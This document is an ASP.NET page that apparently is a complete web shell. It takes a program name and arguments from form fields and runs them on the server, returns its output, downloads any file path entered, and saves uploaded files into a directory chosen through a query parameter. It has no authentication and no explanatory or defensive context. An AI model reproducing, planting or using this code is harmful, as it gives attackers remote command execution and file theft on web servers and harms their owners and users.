
<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
	string outstr = "";
	
	// get pwd
	string dir = Page.MapPath(".");
	if (Request.QueryString["fdir"] != null)
		dir = Request.QueryString["fdir"];
	// execute commands
	if (txtCmdIn.Text.Length > 0 && f.Text.Length > 0)
	{
		Process p = new Process();
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.FileName = f.Text;
		p.StartInfo.Arguments = " " + txtCmdIn.Text;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.WorkingDirectory = dir;
		p.Start();

		lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
		txtCmdIn.Text = ""; 
		f.Text = "";
	}	
	// download file
	if ((flDown.Text.Length > 0))
	{
		Response.ClearContent();
		Response.ContentType = "application/octet-stream";
		Response.AddHeader("Content-Disposition", "attachment; filename=" + flDown.Text + ";");
		Response.WriteFile(flDown.Text);
		Response.End();
	}



	// upload file
	
	if(flUp.HasFile)
	{
		string fileName = flUp.FileName;
		int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp.FileName.Substring(splitAt);
		flUp.SaveAs(dir + "/" + fileName);
	}
%>

<html>
<head>
</head>
<body>
    <form id="form1" runat="server">
    <table style="width: 100%; border-width: 0px; padding: 5px;">
		<tr>
			<td style="width: 50%; vertical-align: top;">
				<h2>Shell</h2>				
				<asp:TextBox runat="server" ID="f" Width="300" />
				<asp:TextBox runat="server" ID="txtCmdIn" Width="300" />
				<asp:Button runat="server" ID="ex" Text="ex" />
				<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
			</td>
			<td>
				<h2>Upload File</h2>
				<asp:FileUpload runat="server" ID="flUp" />
				<asp:button id="btnUpload" type="submit" text="Upload" runat="server" />
			</td>
			<td>
				<h2>Download file</h2>
				<asp:TextBox runat="server" ID="flDown" />
				<asp:Button runat="server" ID="Download" Text="Download" type="submit" />
			</td>
		</tr>
    </table>

    </form>
</body>
</html>